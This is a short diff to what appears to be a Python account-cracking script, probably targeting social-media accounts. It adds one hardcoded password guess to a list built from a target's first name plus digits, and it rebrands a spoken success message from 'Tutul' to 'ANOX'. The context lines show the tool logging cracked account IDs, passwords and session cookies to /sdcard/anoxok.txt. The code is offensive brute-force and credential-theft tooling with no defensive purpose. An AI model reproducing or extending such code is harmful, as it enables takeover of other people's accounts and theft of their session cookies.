@@ -557,6 +557,7 @@ def passwrd():
                 else:
                     pwv.append('57273200')
                     pwv.append(frs+'123')
+                    pwv.append('57575751')
                     pwv.append(frs+'1234')
                     pwv.append(nmf)
                     pwv.append(frs+'12')
@@ -629,7 +630,7 @@ def crack(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r\033[0;92m[ANOX-🙆OK] {idf} | {pw}\n\033[0;93m[😎]= \033[0;92m{kuki} ')
-                os.system('espeak -a 300 " Tutul,  Ok,  id"')
+                os.system('espeak -a 300 " ANOX,  Ok,  id"')
                 open('/sdcard/anoxok.txt','a').write(idf+' | '+pw+' | '+kuki+'\n')
                 break
                 
